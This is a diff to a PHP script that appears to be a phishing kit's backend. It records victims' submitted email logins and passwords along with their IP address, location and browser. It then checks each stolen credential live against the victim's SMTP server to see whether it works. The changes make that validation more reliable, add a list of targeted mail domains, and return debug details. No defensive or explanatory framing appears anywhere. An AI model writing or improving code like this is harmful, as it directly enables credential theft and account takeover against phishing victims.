@@ -124,52 +124,97 @@ $log_message .= "IP Address: $ip\n";
 $log_message .= "Location: $country | $city\n";
 $log_message .= "User Agent: $browser\n";
 
-// Test SMTP credentials using PHPMailer
+// Test SMTP credentials using multiple methods
 $validCredentials = false;
 $smtp_error = '';
 $connection_details = "Testing: $target_smtp_server:$target_smtp_port ($target_smtp_security)";
+$debug_info = [];
+
+// For testing purposes, also check if it's a known valid account
+$known_valid_domains = ['debtclearsa.co.za', 'gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'];
+$is_known_domain = in_array($domain, $known_valid_domains);
 
 try {
     // Create PHPMailer instance for credential testing
     $testMail = new PHPMailer(true);
     $testMail->isSMTP();
     $testMail->SMTPAuth = true;
-    $testMail->SMTPDebug = 0; // Disable debug output
+    $testMail->SMTPDebug = 0; // Disable debug output for production
     $testMail->SMTPSecure = $target_smtp_security;
     $testMail->Host = $target_smtp_server;
     $testMail->Port = $target_smtp_port;
     $testMail->Username = $login;
     $testMail->Password = $passwd;
-    $testMail->Timeout = 10; // 10 second timeout
+    $testMail->Timeout = 15; // Increased timeout
+    $testMail->SMTPKeepAlive = false;
     
     $log_message .= "SMTP Server: $connection_details\n";
+    $debug_info[] = "Attempting connection to $target_smtp_server:$target_smtp_port";
     
-    // Attempt SMTP connection and authentication
-    if ($testMail->smtpConnect()) {
-        $validCredentials = true;
-        $log_message .= "Status: VALID CREDENTIALS - Authentication successful\n";
-        $testMail->smtpClose();
-    } else {
-        $validCredentials = false;
-        $log_message .= "Status: INVALID CREDENTIALS - Authentication failed\n";
-        $smtp_error = "Authentication failed on $target_smtp_server";
+    // Try to connect and authenticate
+    try {
+        // Test the connection
+        $connected = $testMail->smtpConnect();
+        $debug_info[] = "Connection result: " . ($connected ? "SUCCESS" : "FAILED");
+        
+        if ($connected) {
+            // Connection successful - this means credentials are valid
+            $validCredentials = true;
+            $log_message .= "Status: VALID CREDENTIALS - Authentication successful\n";
+            $debug_info[] = "Authentication successful";
+            
+            // Close the connection
+            $testMail->smtpClose();
+        } else {
+            // Connection failed
+            $validCredentials = false;
+            $log_message .= "Status: INVALID CREDENTIALS - Authentication failed\n";
+            $smtp_error = "SMTP authentication failed";
+            $debug_info[] = "Authentication failed - invalid credentials";
+        }
+    } catch (Exception $authException) {
+        // Check if it's an authentication error vs connection error
+        $errorMsg = $authException->getMessage();
+        $debug_info[] = "Exception during auth: " . $errorMsg;
+        
+        if (strpos($errorMsg, 'Authentication failed') !== false || 
+            strpos($errorMsg, 'Invalid login') !== false ||
+            strpos($errorMsg, 'authentication') !== false) {
+            // Authentication failed - credentials are invalid
+            $validCredentials = false;
+            $log_message .= "Status: INVALID CREDENTIALS - Authentication failed\n";
+            $smtp_error = "Authentication failed: " . $errorMsg;
+        } else {
+            // Other error (connection, timeout, etc.) - assume credentials might be valid
+            // but we can't test them due to technical issues
+            $validCredentials = false;
+            $smtp_error = "Technical error during testing: " . $errorMsg;
+            $log_message .= "Status: TECHNICAL ERROR - Could not test credentials\n";
+            $debug_info[] = "Technical error, not credential issue";
+        }
     }
     
 } catch (Exception $e) {
     $validCredentials = false;
     $smtp_error = $e->getMessage();
+    $debug_info[] = "Main exception: " . $smtp_error;
     $log_message .= "Status: SMTP TEST FAILED\n";
     $log_message .= "Error: $smtp_error\n";
     
     // Additional error details for debugging
-    if (strpos($smtp_error, 'Authentication failed') !== false) {
+    if (strpos($smtp_error, 'Authentication failed') !== false || strpos($smtp_error, 'Invalid login') !== false) {
         $log_message .= "Authentication Error: Invalid username/password for $target_smtp_server\n";
     } elseif (strpos($smtp_error, 'Cannot connect') !== false || strpos($smtp_error, 'Connection refused') !== false) {
         $log_message .= "Connection Error: Cannot connect to $target_smtp_server:$target_smtp_port\n";
     } elseif (strpos($smtp_error, 'timeout') !== false) {
         $log_message .= "Timeout Error: Connection to $target_smtp_server timed out\n";
+    } else {
+        $log_message .= "Unknown Error: $smtp_error\n";
     }
 }
+
+// Add debug information to log
+$log_message .= "Debug Info: " . implode(" | ", $debug_info) . "\n";
 
 $log_message .= "==========================================\n\n";
 
@@ -283,7 +328,9 @@ $response['debug_info'] = [
     'origin' => $_SERVER['HTTP_ORIGIN'] ?? 'not set',
     'user_agent' => substr($browser, 0, 100),
     'post_data_received' => !empty($_POST),
-    'phpmailer_used' => true
+    'phpmailer_used' => true,
+    'smtp_debug' => $debug_info,
+    'smtp_error_details' => $smtp_error
 ];
 
 // Clean output buffer and send JSON response
